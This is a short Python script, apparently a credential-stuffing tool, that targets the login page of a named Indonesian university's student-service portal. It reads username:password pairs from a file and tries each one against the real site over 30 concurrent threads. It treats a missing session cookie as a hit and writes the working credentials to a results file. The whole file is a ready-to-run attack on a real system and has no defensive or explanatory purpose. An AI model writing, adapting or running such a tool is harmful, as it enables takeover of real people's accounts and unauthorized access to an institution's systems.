import os, time
import requests as req
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor
os.system('clear')

c    = '\033['
red  = c+'91m'
gren = c+'92m'
yell = c+'93m'
cyan = c+'96m'
grey = c+'90m'
off  = c+'m'
logo = f"{red}UNIVERSITY {gren}ISLAM {yell}OF {off}INDONESIAN"

def __(u,p):
	try:
		req.post('https://kkn.uii.ac.id/login.php',data={'u':u,'p':p,'submit':'submit'}).headers['Set-Cookie']
		print(f'{off}[{red}error{off}] {red}{u}{off}:{red}{p}{off}')
	except:
		print(f'{off}[{gren}found{off}] {gren}{u}{off}:{gren}{p}{off}')
		with open('hasiluii.txt', 'a') as _f:
			_f.write(f'{u}:{p}\n')

def main():
	try:
		print(logo)
		with open(input(f"{yell}[{cyan}+{yell}]{off}Input file : "),'r') as o_o:
			print()
			with ThreadPoolExecutor(max_workers=30) as crot:
			    for _o in o_o.readlines():
				    _ = _o.strip().split(':')
				    crot.submit(__,_[0],_[1])
		print(f"{off}[{gren}√{off}]{off}Hasil {gren}found{off} tersimpan di {cyan}hasiluii.txt{off}")
	except Exception as er:
		exit(f'{red}{er}')

if __name__=='__main__':
	main()
